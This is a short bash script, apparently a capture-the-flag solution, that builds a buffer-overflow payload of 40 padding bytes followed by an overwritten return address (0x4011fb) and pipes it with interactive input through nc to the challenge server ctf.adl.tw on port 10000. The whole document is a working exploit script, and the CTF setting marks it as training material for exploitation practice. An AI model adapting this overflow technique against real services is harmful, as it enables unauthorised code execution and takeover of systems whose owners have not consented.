#!/bin/bash

if [[ -e payload ]]; then
    rm payload
fi

host="ctf.adl.tw"
port=10000

printf 'a%.0s' {1..40} > payload
printf "\xfb\x11\x40\x00\x00\x00\x00\x00" >> payload

cat payload - | nc $host $port
